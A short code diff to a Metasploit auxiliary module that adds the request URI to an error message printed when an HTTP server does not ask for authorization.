@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     if res.code != 401
-      vprint_error("http://#{rhost}:#{rport} - Authorization not requested")
+      vprint_error("http://#{rhost}:#{rport}#{uri} - Authorization not requested")
       return
     end
 
